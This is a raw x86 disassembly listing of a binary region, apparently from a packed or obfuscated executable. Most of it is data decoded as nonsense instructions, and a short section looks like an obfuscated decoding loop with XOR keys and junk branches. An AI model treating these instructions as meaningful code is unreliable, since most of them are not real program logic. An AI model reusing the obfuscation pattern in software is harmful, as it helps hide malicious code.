  4088b7:	int3   
  4088b8:	xchg   esp,edx
  4088ba:	test   al,0x83
  4088bc:	es xchg ebp,eax
  4088be:	les    edx,FWORD PTR [ecx+0x48]
  4088c1:	ins    BYTE PTR es:[edi],dx
  4088c2:	sbb    eax,0xe84c5946
  4088c7:	mov    cl,BYTE PTR [ecx+esi*2]
  4088ca:	stos   BYTE PTR es:[edi],al
  4088cb:	es js  0x408933
  4088ce:	fstp   TBYTE PTR [eax-0x2b]
  4088d1:	or     ah,BYTE PTR ds:0xce107881
  4088d7:	adc    DWORD PTR [esi-0x6e225bc1],0x7ed7327c
  4088e1:	adc    dh,BYTE PTR ss:[eax+0x1ddea8fd]
  4088e8:	hlt    
  4088e9:	and    bl,BYTE PTR [ecx]
  4088eb:	mov    bh,0x58
  4088ed:	xchg   edx,eax
  4088ee:	and    BYTE PTR [ecx-0x23],dl
  4088f1:	cmp    al,0xab
  4088f3:	inc    edx
  4088f4:	dec    ebp
  4088f5:	sub    eax,0xc7b259c0
  4088fa:	cmp    DWORD PTR [eax],edx
  4088fc:	pusha  
  4088fd:	pop    eax
  4088fe:	outs   dx,DWORD PTR ds:[esi]
  4088ff:	clc    
  408900:	aam    0xe9
  408902:	les    eax,FWORD PTR [ebp-0x6a11bef0]
  408908:	push   esi
  408909:	scas   al,BYTE PTR es:[edi]
  40890a:	pop    esi
  40890b:	mov    dl,0xe8
  40890d:	mov    al,ds:0x43d24bc3
  408912:	nop
  408913:	mov    al,ds:0xf6239fae
  408918:	test   BYTE PTR [edi+0x69],dh
  40891b:	ret    0x81ab
  40891e:	pop    ds
  40891f:	pop    edi
  408920:	sub    BYTE PTR [esi],al
  408922:	popa   
  408923:	enter  0x7c7f,0x4d
  408927:	cmp    BYTE PTR [edi-0x6b],0xfd
  40892b:	enter  0xfcda,0x5e
  40892f:	sub    ah,bh
  408931:	ins    BYTE PTR es:[edi],dx
  408932:	mov    DWORD PTR [ecx-0x70412301],edi
  408938:	pop    ss
  408939:	mov    ah,0x22
  40893b:	pop    ds
  40893c:	loop   0x40892d
  40893e:	(bad)  
  40893f:	int3   
  408940:	jae    0x4089c1
  408942:	mov    bh,0x1a
  408944:	jb     0x40892d
  408946:	jl     0x408902
  408948:	fist   WORD PTR [ecx]
  40894a:	shl    DWORD PTR [ecx],cl
  40894c:	adc    eax,0xef67c94f
  408951:	jbe    0x4089c5
  408953:	mov    es,WORD PTR [ebx-0x2d5c8589]
  408959:	(bad)  
  40895a:	je     0x408965
  40895c:	and    BYTE PTR [edi-0x5993b1a6],cl
  408962:	add    DWORD PTR [ecx],eax
  408964:	and    bh,BYTE PTR [edx]
  408966:	jnp    0x408924
  408968:	dec    edx
  408969:	adc    DWORD PTR [eax],edx
  40896b:	gs mov bh,0xeb
  40896e:	sub    al,0x8e
  408970:	in     al,dx
  408971:	out    dx,eax
  408972:	test   al,0x3d
  408974:	mov    dh,0xbf
  408976:	fwait
  408977:	data16 jne 0x408996
  40897a:	pop    ecx
  40897b:	jbe    0x408901
  40897d:	inc    edi
  40897e:	mov    ecx,0x68b9c0b1
  408983:	or     al,0x13
  408985:	add    DWORD PTR [ebx+0x6c],edx
  408988:	add    BYTE PTR [edi-0x5d4e520e],cl
  40898e:	push   ss
  40898f:	sti    
  408990:	jb     0x40895c
  408992:	(bad)  
  408993:	aaa    
  408994:	ss jno 0x40897f
  408997:	adc    eax,0xfc6b7d68
  40899c:	lahf   
  40899d:	sbb    ah,dh
  40899f:	xor    cl,cl
  4089a1:	stos   BYTE PTR es:[edi],al
  4089a2:	das    
  4089a3:	cmp    al,0x4
  4089a5:	push   cs
  4089a6:	hlt    
  4089a7:	adc    eax,eax
  4089a9:	add    al,0x3a
  4089ab:	sub    eax,0x6a9d7833
  4089b0:	pop    ds
  4089b1:	mov    BYTE PTR gs:[di-0xd49],0x2c
  4089b8:	add    bl,ah
  4089ba:	jae    0x40895e
  4089bc:	imul   esp,DWORD PTR [esi+0x4c89a22e],0xffffffb7
  4089c3:	mov    edi,0x126c9b55
  4089c8:	push   eax
  4089c9:	ret    
  4089ca:	not    ah
  4089cc:	push   0xffffffc3
  4089ce:	cs mov eax,0x27049b07
  4089d4:	and    DWORD PTR [edi-0x7567d588],ecx
  4089da:	xchg   ebp,eax
  4089db:	dec    ecx
  4089dc:	xchg   edi,eax
  4089dd:	cmp    ebp,esi
  4089df:	retf   0xdb20
  4089e2:	push   ebp
  4089e3:	inc    BYTE PTR [edx]
  4089e5:	cld    
  4089e6:	push   ss
  4089e7:	mov    al,0xe2
  4089e9:	inc    eax
  4089ea:	das    
  4089eb:	gs jmp 0xed0b:0xa7748265
  4089f3:	ds call 0x6ec5a601
  4089f9:	pop    edi
  4089fa:	and    BYTE PTR [ebx+0x49],0xb4
  4089fe:	push   esp
  4089ff:	inc    ebx
  408a00:	inc    esp
  408a01:	mov    ebx,0xe3304e3
  408a06:	pop    eax
  408a07:	and    ebx,DWORD PTR [edi]
  408a09:	adc    BYTE PTR [eax+0x23],0x57
  408a0d:	cli    
  408a0e:	dec    ebp
  408a0f:	and    BYTE PTR [ecx],ch
  408a11:	xor    dl,BYTE PTR [eax+edx*8+0x21c98b50]
  408a18:	retf   
  408a19:	pop    esp
  408a1a:	repnz popf 
  408a1c:	sar    DWORD PTR [eax+0x1c],cl
  408a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a20:	push   eax
  408a21:	pop    ecx
  408a22:	jge    0x408a4f
  408a24:	in     al,0xb7
  408a26:	stc    
  408a27:	fwait
  408a28:	add    eax,0xe2b76598
  408a2d:	loop   0x408a62
  408a2f:	adc    eax,0x210e4982
  408a34:	scas   eax,DWORD PTR es:[edi]
  408a35:	dec    ebx
  408a36:	jnp    0x408a14
  408a38:	and    eax,0xc295f2b3
  408a3d:	ins    BYTE PTR es:[edi],dx
  408a3e:	int3   
  408a3f:	sub    eax,DWORD PTR [edx-0x72]
  408a42:	cld    
  408a43:	out    0x21,eax
  408a45:	adc    BYTE PTR [ebx-0x79],dl
  408a48:	loope  0x408aa4
  408a4a:	push   ds
  408a4b:	repz out dx,al
  408a4d:	inc    ebx
  408a4e:	mov    eax,ds:0xea5a84c8
  408a53:	mul    DWORD PTR [esi+0x3d]
  408a56:	test   eax,0x976d920c
  408a5b:	push   esp
  408a5c:	inc    esi
  408a5d:	cli    
  408a5e:	in     al,dx
  408a5f:	or     edx,DWORD PTR [edx]
  408a61:	mov    eax,ebx
  408a63:	fdivr  DWORD PTR [esi+0x67133a21]
  408a69:	inc    eax
  408a6a:	add    DWORD PTR [ebp-0x77],edx
  408a6d:	or     al,0x4
  408a6f:	mov    DWORD PTR [ecx],eax
  408a71:	pop    esi
  408a72:	leave  
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0xafb3a4f9
  408a92:	call   0xe47978f3
  408a97:	js     0x408b11
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408a74
  408a9e:	inc    eax
  408a9f:	arpl   WORD PTR [esi],sp
  408aa1:	cmp    BYTE PTR [esp+edx*8-0xe],dl
  408aa5:	jg     0x408a43
  408aa7:	xchg   edx,eax
  408aa8:	xchg   ebp,eax
  408aa9:	inc    eax
  408aaa:	xchg   edi,eax
  408aab:	sbb    DWORD PTR [edi],ebx
  408aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aae:	mov    ds:0xece21824,al
  408ab3:	js     0x408b18
  408ab5:	push   0x33
  408ab7:	test   cl,al
  408ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408aba:	outs   dx,DWORD PTR ds:[esi]
  408abb:	xchg   DWORD PTR [ebp+0xe63977a],esp
  408ac1:	in     eax,0x82
  408ac3:	repnz xor DWORD PTR [esi-0x5e2d1aa1],esp
  408aca:	push   0xffffff84
  408acc:	dec    ebp
  408acd:	add    al,0x8f
  408acf:	lea    eax,[edx-0x5a74a3e3]
  408ad5:	cmp    eax,0xb8f81f4a
  408ada:	push   ds
  408adb:	sbb    eax,0xa5b5a00b
  408ae0:	add    eax,esp
  408ae2:	ins    DWORD PTR es:[edi],dx
  408ae3:	push   es
  408ae4:	fisub  WORD PTR [edi]
  408ae6:	bound  esp,QWORD PTR [edx+0x0]
  408ae9:	dec    ecx
  408aea:	mov    ebx,0xab4a3a3c
  408aef:	add    bh,BYTE PTR [eax+esi*4]
  408af2:	pop    edi
  408af3:	mov    ds:0x43fb5b45,eax
  408af8:	call   0x96f86058
  408afd:	aad    0x9e
  408aff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b00:	xchg   ebx,eax
  408b01:	sbb    esp,0xd5e4c549
  408b07:	mov    edx,0x6962a432
  408b0c:	pop    ebp
  408b0d:	mov    eax,ds:0x5c272aec
  408b12:	push   eax
  408b13:	js     0x408a96
  408b15:	mov    ebx,DWORD PTR [edx+0x1e]
  408b18:	jne    0x408b6c
  408b1a:	daa    
  408b1b:	adc    eax,0xa919dc7d
  408b20:	mov    al,0x11
  408b22:	lds    eax,FWORD PTR [edi]
  408b24:	mov    ah,0x42
  408b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b27:	aam    0x30
  408b29:	cmp    eax,0x741a9f1c
  408b2e:	mov    edx,0x8eee8d8c
  408b33:	in     eax,dx
  408b34:	ss inc ebx
  408b36:	jne    0x408b38
  408b38:	jns    0x408b12
  408b3a:	aad    0xf4
  408b3c:	pop    edi
  408b3d:	outs   dx,BYTE PTR ds:[esi]
  408b3e:	xor    DWORD PTR [ecx-0x4307dc78],edi
  408b44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b45:	or     ebp,eax
  408b47:	sbb    DWORD PTR [ecx+esi*2],0xfd5d920f
  408b4e:	(bad)  
  408b51:	cmp    ch,BYTE PTR [edi]
  408b53:	jl     0x408ad8
  408b55:	out    0x2a,eax
  408b57:	mov    ch,0xa8
  408b59:	and    edx,esp
  408b5b:	leave  
  408b5c:	pop    edx
  408b5d:	add    bl,BYTE PTR [ecx-0x20]
  408b60:	call   0xb782442f
  408b65:	ds pop ecx
  408b67:	cmp    al,0xb7
  408b69:	xor    BYTE PTR [esi],cl
  408b6b:	mov    ecx,ecx
  408b6d:	pop    ds
  408b6e:	mov    ?,WORD PTR [esi-0x41]
  408b71:	popf   
  408b72:	sub    ah,dh
  408b74:	inc    ecx
  408b75:	les    ecx,FWORD PTR [ebx-0x3d]
  408b78:	jp     0x408b86
  408b7a:	mul    DWORD PTR [esi]
  408b7c:	into   
  408b7d:	add    eax,0xcf1d2009
  408b82:	fs sbb eax,0x75682f0b
  408b88:	adc    eax,0x3a18e1b4
  408b8d:	out    0x45,al
  408b8f:	loopne 0x408bf7
  408b91:	dec    esp
  408b92:	and    eax,0x133ba6c9
  408b97:	stos   BYTE PTR es:[edi],al
  408b98:	mov    bl,0xc3
  408b9a:	in     eax,0x9d
  408b9c:	sahf   
  408b9d:	push   ebx
  408b9e:	shl    al,0xa6
  408ba1:	sub    BYTE PTR [edx+0x29f22d37],bl
  408ba7:	mov    al,0x5
  408ba9:	test   eax,0x25eeca06
  408bae:	xor    BYTE PTR [esi],ah
  408bb0:	aas    
  408bb1:	outs   dx,DWORD PTR ds:[esi]
  408bb3:	jle    0x408b69
  408bb5:	push   es
  408bb6:	imul   esi,DWORD PTR fs:[ecx+edi*8],0xd6b10079
  408bbe:	push   edi
  408bbf:	js     0x408b56
  408bc1:	ret    0x5dd5
  408bc4:	sub    eax,DWORD PTR [eax-0x10693cd9]
  408bca:	(bad)  
  408bcb:	and    eax,0x3489e0c9
  408bd0:	int3   
  408bd1:	xchg   ebx,eax
  408bd2:	add    eax,0x76e4689c
  408bd7:	jp     0x408bcd
  408bd9:	repz scas eax,DWORD PTR es:[edi]
  408bdb:	stos   BYTE PTR es:[edi],al
  408bdc:	dec    ebp
  408bdd:	repz jae 0x408bbf
  408be0:	dec    ebx
  408be1:	xor    bh,BYTE PTR [esi]
  408be3:	inc    edi
  408be4:	enter  0xc90c,0x5d
  408be8:	inc    ebx
  408be9:	es (bad) 
  408bee:	dec    ecx
  408bef:	xor    esp,esp
  408bf1:	retf   0xc9ce
  408bf4:	loopne 0x408be5
  408bf6:	aaa    
  408bf7:	xchg   ebx,eax
  408bf8:	dec    esi
  408bf9:	rcl    DWORD PTR [edx+ebx*2],0xd7
  408bfd:	(bad)  
  408bfe:	sbb    DWORD PTR [ecx+esi*2],edx
  408c01:	cld    
  408c02:	imul   ebx,DWORD PTR [eax],0xffffffee
  408c05:	inc    ecx
  408c06:	sub    ch,bl
  408c08:	mov    eax,ds:0x57b5c9cd
  408c0d:	or     ah,BYTE PTR [ecx+0xc8ff401]
  408c13:	iret   
  408c14:	adc    esi,edi
  408c16:	ss inc eax
  408c18:	mov    ebp,0x207a83a1
  408c1d:	add    DWORD PTR es:0xf4b42ce0,eax
  408c24:	gs dec ebx
  408c26:	mov    eax,0xf50816f5
  408c2b:	fwait
  408c2c:	xchg   edi,eax
  408c2d:	adc    eax,0xdb926f9
  408c32:	ins    DWORD PTR es:[edi],dx
  408c33:	fprem1 
  408c35:	int3   
  408c36:	push   ds
  408c37:	xchg   ebx,eax
  408c38:	mov    ds:0x32614fee,eax
  408c3d:	fcom   QWORD PTR [ecx-0x74]
  408c40:	fst    QWORD PTR [eax]
  408c42:	adc    DWORD PTR [ebp+0x1e17cd7a],0x56
  408c49:	adc    DWORD PTR [ebp-0x25],edx
  408c4c:	xor    DWORD PTR [edx+0x7571e03e],ebx
  408c52:	pop    ecx
  408c53:	inc    ecx
  408c54:	test   eax,0x48e152ea
  408c59:	jns    0x408c01
  408c5b:	icebp  
  408c5c:	inc    edx
  408c5d:	adc    eax,0xe64f7485
  408c62:	pushw  cs
  408c64:	pop    esi
  408c65:	sti    
  408c66:	mov    cl,0x72
  408c68:	stc    
  408c69:	xchg   esi,eax
  408c6a:	pusha  
  408c6b:	fisttp WORD PTR [edx-0x76]
  408c6e:	inc    edx
  408c6f:	jo     0x408ce3
  408c71:	fcmovu st,st(1)
  408c73:	and    eax,0x16e28f06
  408c78:	mov    eax,0x5932295e
  408c7d:	sbb    DWORD PTR ds:[esi+0x1],esi
  408c81:	clc    
  408c82:	stos   BYTE PTR es:[edi],al
  408c83:	imul   edi,DWORD PTR [ecx],0xf2a41825
  408c89:	or     BYTE PTR [edi+0x50745879],dl
  408c8f:	fisub  DWORD PTR [ebx-0x520da7b9]
  408c95:	test   eax,0xd85e884f
  408c9a:	and    ecx,edi
  408c9c:	sub    eax,0x2c9998d4
  408ca1:	mov    bh,BYTE PTR [eax+0x7b]
  408ca4:	test   BYTE PTR [ecx+0x21],ch
  408ca7:	fbstp  TBYTE PTR [edi]
  408ca9:	push   es
  408caa:	les    edi,FWORD PTR [ecx-0x73450eb9]
  408cb0:	ret    
  408cb1:	jmp    0x51fb:0xb38e7219
  408cb8:	mov    eax,ds:0xb3d14989
  408cbd:	adc    BYTE PTR [esi],0x68
  408cc0:	jb     0x408d20
  408cc2:	ja     0x408c72
  408cc4:	mov    eax,ds:0x340e24e4
  408cc9:	fcomp  st(0)
  408ccb:	shl    BYTE PTR [edx-0x80],1
  408cce:	mov    bl,0x18
  408cd0:	jge    0x408d06
  408cd2:	sub    eax,DWORD PTR [ebp-0x30]
  408cd5:	fcos   
  408cd7:	and    DWORD PTR [ebx],ebx
  408cd9:	ds sub dl,ah
  408cdc:	sbb    bl,ah
  408cde:	dec    esi
  408cdf:	pop    esp
  408ce0:	fucomi st,st(1)
  408ce2:	mov    ds:0xd32f7069,eax
  408ce7:	pop    eax
  408ce8:	sbb    ah,ah
  408cea:	(bad)  
  408ceb:	fs lahf 
  408ced:	jecxz  0x408d03
  408cef:	rcr    BYTE PTR [ebp-0x31],0x31
  408cf3:	arpl   WORD PTR [edi],bp
  408cf5:	dec    ebx
  408cf6:	ins    DWORD PTR es:[edi],dx
  408cf7:	sub    BYTE PTR [ebx+0x7d],0xaf
  408cfb:	lahf   
  408cfc:	push   ebx
  408cfd:	sbb    ebp,DWORD PTR [ebp+0x27f1eb4f]
  408d03:	or     eax,0x33da2b6e
  408d08:	and    eax,0x78195a55
  408d0d:	xchg   ebx,eax
  408d0e:	dec    esi
  408d0f:	cmp    al,0xa1
  408d11:	inc    ecx
  408d12:	xor    eax,0x5e8f5bd4
  408d17:	test   BYTE PTR [ebx],cl
  408d19:	mov    WORD PTR [ebp-0x22],ss
  408d1c:	fsubr  QWORD PTR [ebx-0x5df0cc29]
  408d22:	xchg   esp,eax
  408d23:	inc    ebp
  408d24:	shr    edx,1
  408d26:	dec    eax
  408d27:	cwde   
  408d28:	or     al,0xbe
  408d2a:	popf   
  408d2b:	push   ss
  408d2c:	jno    0x408d8d
  408d2e:	ret    0x95c8
  408d31:	adc    ah,BYTE PTR [ecx]
  408d33:	scas   al,BYTE PTR es:[edi]
  408d34:	gs jmp 0x408ccf
  408d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d38:	jmp    0x2ac2:0x5200523e
  408d3f:	pop    es
  408d40:	retf   
  408d41:	in     al,0xe7
  408d43:	jb     0x408d88
  408d45:	add    bh,0x45
  408d48:	clc    
  408d49:	cmp    BYTE PTR [ebp+0x45c7f89c],al
  408d4f:	cld    
  408d50:	cmp    DWORD PTR [ebp+0x458bf89c],eax
  408d56:	cld    
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a88d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a8ad,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7e1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7e1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7e1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7e1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7e1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7e1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7e1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7e1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a815
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7dd
  408de2:	mov    DWORD PTR ds:0x42a815,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a829,0x42a785
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a79d,0x42a819
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0xb
  408e1d:	pusha  
  408e1e:	xor    eax,0x78ea67d3
  408e23:	js     0x408dcc
  408e25:	jle    0x408e9f
  408e27:	js     0x408dfe
  408e29:	mov    ss,WORD PTR [edi]
  408e2b:	popa   
  408e2c:	or     al,0xf4
  408e2e:	pop    es
  408e2f:	dec    ebx
  408e30:	and    DWORD PTR [edi+0x77aa3545],ebx
  408e36:	jno    0x408e71
  408e38:	popa   
  408e39:	daa    
  408e3a:	fld    QWORD PTR [ecx+0x492a8892]
  408e40:	push   edi
  408e41:	loope  0x408e77
  408e43:	cwde   
  408e44:	dec    ecx
  408e45:	mov    ah,0xdb
  408e47:	ins    DWORD PTR es:[edi],dx
  408e48:	shl    BYTE PTR [ecx-0x3d],0x7e
  408e4c:	fnstcw WORD PTR [eax+0xdbf3a6b]
  408e52:	push   edi
  408e53:	out    dx,al
  408e54:	mov    cl,0x26
  408e56:	jmp    0x36d69fe6
  408e5b:	int3   
  408e5c:	(bad)  
  408e5d:	jbe    0x408ec7
  408e5f:	dec    esp
  408e60:	sbb    BYTE PTR [edi],dh
  408e62:	into   
  408e63:	ins    DWORD PTR es:[edi],dx
  408e64:	push   0xbd8d2ed9
  408e69:	sub    ecx,DWORD PTR [esi-0x39]
  408e6c:	addr16 xchg edx,eax
  408e6e:	jns    0x408e24
  408e70:	idiv   BYTE PTR [ebx-0x6351c02e]
  408e76:	inc    ecx
  408e77:	and    DWORD PTR [edx],ebp
  408e79:	ja     0x408ef1
  408e7b:	ret    
  408e7c:	ins    BYTE PTR es:[edi],dx
  408e7d:	out    0xbe,eax
  408e7f:	loopne 0x408e93
  408e81:	pop    ecx
  408e82:	call   0xa5ae:0x50b148f8
  408e89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e8a:	sahf   
  408e8b:	add    cl,bh
  408e8d:	jge    0x408ed1
  408e8f:	xor    al,0x95
  408e91:	xchg   esi,eax
  408e92:	add    eax,0xa3e71dd9
  408e97:	sbb    BYTE PTR [esi-0xeb493f1],al
  408e9d:	mov    ebx,0x89dd414a
  408ea2:	into   
  408ea3:	shl    BYTE PTR [ebp+0x1c3cc33f],1
  408ea9:	cwde   
  408eaa:	add    BYTE PTR [ebx],dh
  408eac:	imul   ebx,DWORD PTR [ebp-0x4d8eca59],0x71
  408eb3:	cdq    
  408eb4:	xchg   ecx,eax
  408eb5:	cli    
  408eb6:	fistp  QWORD PTR [ebp-0xf]
  408eb9:	xor    cl,BYTE PTR [ebx]
  408ebb:	(bad)  
  408ebd:	fldenv [ecx+0x4c785fd]
  408ec3:	gs pop ss
  408ec5:	xchg   esi,eax
  408ec6:	sub    ax,sp
  408ec9:	mov    dh,0x8d
  408ecb:	sets   BYTE PTR [ebp-0x78]
  408ecf:	rol    DWORD PTR [ecx+eiz*2+0x6a],cl
  408ed3:	sbb    BYTE PTR [ebx],ch
  408ed5:	pop    edx
  408ed6:	in     eax,dx
  408ed7:	frstor [esi+0x3648e93d]
  408edd:	xor    BYTE PTR ss:[ebx+0x56],cl
  408ee1:	jns    0x408f0b
  408ee3:	sbb    DWORD PTR [eax+0x1a],ecx
  408ee6:	loope  0x408eb3
  408ee8:	cmc    
  408ee9:	cwde   
  408eea:	xchg   edx,eax
  408eeb:	mov    DWORD PTR [ecx],0x721445f3
  408ef1:	or     BYTE PTR [edx-0x1da66816],bl
  408ef7:	adc    eax,0xb5d1f832
  408efc:	adc    ecx,DWORD PTR [ebx-0x74d8b5cf]
  408f02:	lds    ebx,FWORD PTR [ebp-0x6d]
  408f05:	adc    DWORD PTR [esi+0x4ff5bf92],esi
  408f0b:	jmp    0xf31f95df
  408f10:	bound  ecx,QWORD PTR [ebp+0x4e]
  408f13:	mov    ds:0x3d56cff6,eax
  408f18:	div    DWORD PTR [ecx]
  408f1a:	xchg   esp,eax
  408f1b:	dec    esi
  408f1c:	sbb    bl,dl
  408f1e:	(bad)  
  408f20:	cs fwait
  408f22:	test   BYTE PTR [ebx-0x4d],ch
  408f25:	in     al,0x28
  408f27:	xor    al,0x6
  408f29:	sbb    al,0xff
  408f2b:	sub    dh,dh
  408f2d:	xchg   ecx,eax
  408f2e:	jno    0x408f6b
  408f30:	stos   DWORD PTR es:[edi],eax
  408f31:	push   eax
  408f32:	dec    eax
  408f33:	pop    edi
  408f34:	jl     0x408f64
  408f36:	loope  0x408ef0
  408f38:	out    dx,al
  408f39:	jmp    0xb02439cb
  408f3e:	test   esp,0x5a1eb6e5
  408f44:	hlt    
  408f45:	fild   QWORD PTR ds:0x6cb43775
  408f4b:	call   0x226c8059
  408f50:	pop    esi
  408f51:	lock fcmovnbe st,st(7)
  408f54:	cmp    al,0x1b
  408f56:	add    al,0x5e
  408f58:	jmp    0x85645edc
  408f5d:	mov    ebp,0xe1d2651
  408f62:	add    ebx,edx
  408f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f65:	dec    esp
  408f66:	push   esi
  408f67:	stos   BYTE PTR es:[edi],al
  408f68:	icebp  
  408f69:	lock sub cl,0xec
  408f6d:	cdq    
  408f6e:	push   ebp
  408f6f:	cmp    eax,0x93e61b89
  408f74:	test   eax,0x4a51d05b
  408f79:	imul   esi,ebx,0x3c
  408f7c:	std    
  408f7d:	lods   eax,DWORD PTR ds:[esi]
  408f7e:	jge    0x408f96
  408f80:	adc    edx,edx
  408f82:	pusha  
  408f83:	xchg   esp,eax
  408f84:	sub    cl,dh
  408f86:	lods   al,BYTE PTR ds:[esi]
  408f87:	cwde   
  408f88:	shl    DWORD PTR [edi+0x71],1
  408f8b:	cmp    al,0xb9
  408f8d:	cmp    BYTE PTR ds:0x86d525a8,cl
  408f93:	imul   ecx,ebp,0x23
  408f96:	arpl   bx,sp
  408f98:	jecxz  0x408f8b
  408f9a:	mov    WORD PTR [esp+eax*2],fs
  408f9d:	sub    eax,0x7d391a11
  408fa2:	push   edx
  408fa3:	mov    ebp,0xdec577e6
  408fa8:	dec    edx
  408fa9:	imul   ch
  408fab:	aaa    
  408fac:	jge    0x408fb6
  408fae:	loopne 0x408f60
  408fb0:	jecxz  0x408f92
  408fb2:	into   
  408fb3:	pop    esp
  408fb4:	mov    ds:0x29fbc80f,al
  408fb9:	cdq    
  408fba:	inc    eax
  408fbb:	xchg   ecx,eax
  408fbc:	jecxz  0x409017
  408fbe:	mov    ebp,DWORD PTR [ebx]
  408fc0:	and    al,dl
  408fc2:	leave  
  408fc3:	lods   al,BYTE PTR ds:[esi]
  408fc4:	cli    
  408fc5:	pop    es
  408fc6:	sub    bh,BYTE PTR [edx]
  408fc8:	je     0x408fb3
  408fca:	mov    al,0x1e
  408fcc:	fild   QWORD PTR [edx]
  408fce:	xor    DWORD PTR [ebx],0xfffffffd
  408fd1:	adc    BYTE PTR [ebp-0x7d],ah
  408fd4:	mov    ds:0x30b9cd42,eax
  408fd9:	retf   
  408fda:	jnp    0x409028
  408fdc:	pop    ebx
  408fdd:	mov    ah,0x42
  408fdf:	call   0xf14c:0xcad65daa
  408fe6:	push   0xc2e1ffc5
  408feb:	push   edx
  408fec:	push   edi
  408fed:	aam    0xd3
  408fef:	fiadd  WORD PTR [ecx+0x7b8be944]
  408ff5:	jo     0x409068
  408ff7:	imul   edx,DWORD PTR [edi+0x3a7641af],0x453d3473
  409001:	(bad)  
  409002:	(bad)  
  409003:	jae    0x408f8e
  409005:	inc    esi
  409006:	test   eax,0x960ed5ab
  40900b:	inc    ebp
  40900c:	dec    eax
  40900d:	dec    esi
  40900e:	cwde   
  40900f:	(bad)  
  409011:	adc    cl,BYTE PTR [ebx+edi*2-0x611d80ee]
  409018:	popa   
  409019:	sub    ebx,DWORD PTR [ecx-0x42a61ac4]
  40901f:	push   ds
  409020:	fdiv   QWORD PTR [edx]
  409022:	pop    ecx
  409023:	sbb    al,0x73
  409025:	fidivr WORD PTR [ebp-0x44f7351a]
  40902b:	adc    eax,0x5b6acdd6
  409030:	cs xor al,0x7c
  409033:	iret   
  409034:	ud0    ebp,DWORD PTR [edi-0x743798c9]
  40903b:	test   ah,bl
  40903d:	push   ebp
  40903e:	imul   edx,DWORD PTR ss:[ebx-0x65],0x4
  409043:	pop    ebx
  409044:	push   0x8ba81df
  409049:	sub    edx,DWORD PTR [edi]
  40904b:	in     al,0x89
  40904d:	in     al,dx
  40904e:	cmp    ch,BYTE PTR [edx]
  409050:	inc    DWORD PTR [ecx]
  409052:	mov    al,0x47
  409054:	pop    esi
  409055:	pop    ss
  409056:	xchg   ecx,eax
  409057:	(bad)  
  409058:	pop    ebx
  409059:	pop    edi
  40905a:	aad    0x55
  40905c:	aaa    
  40905d:	lock xor al,0x98
  409060:	mov    edi,0x93b908a
  409065:	pusha  
  409066:	lea    ebp,[ebp-0x34cdb9b8]
  40906c:	loope  0x4090b7
  40906e:	repz sbb DWORD PTR [eax],0xb70ace09
  409075:	sbb    ah,BYTE PTR [edx]
  409077:	mov    ebx,0x6be9bc5e
  40907c:	xchg   edx,eax
  40907d:	repnz out 0xf1,eax
  409080:	div    DWORD PTR [ebp-0xbf687d]
  409086:	ror    edi,cl
  409088:	ret    
  409089:	pop    DWORD PTR [edx]
  40908b:	xor    eax,0x3a597592
  409090:	es pop edx
  409092:	cmp    al,0x6c
  409094:	mov    bh,BYTE PTR [edx-0x25]
  409097:	cdq    
  409098:	enter  0x157f,0x97
  40909c:	gs inc ecx
  40909e:	pop    edx
  40909f:	ins    BYTE PTR es:[edi],dx
  4090a0:	add    edx,eax
  4090a2:	inc    eax
  4090a3:	(bad)  
  4090a4:	scas   eax,DWORD PTR es:[edi]
  4090a5:	xchg   esp,eax
  4090a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090a7:	(bad)  
  4090a8:	jp     0x40909e
  4090aa:	scas   al,BYTE PTR es:[edi]
  4090ab:	cli    
  4090ac:	dec    ebx
  4090ad:	enter  0x644b,0x42
  4090b1:	cmp    ebx,DWORD PTR [ecx]
  4090b3:	bound  ebp,QWORD PTR ds:0x74368d84
  4090b9:	pushf  
  4090ba:	xchg   esi,eax
  4090bb:	mov    ss,edx
  4090bd:	ins    DWORD PTR es:[edi],dx
  4090be:	dec    edi
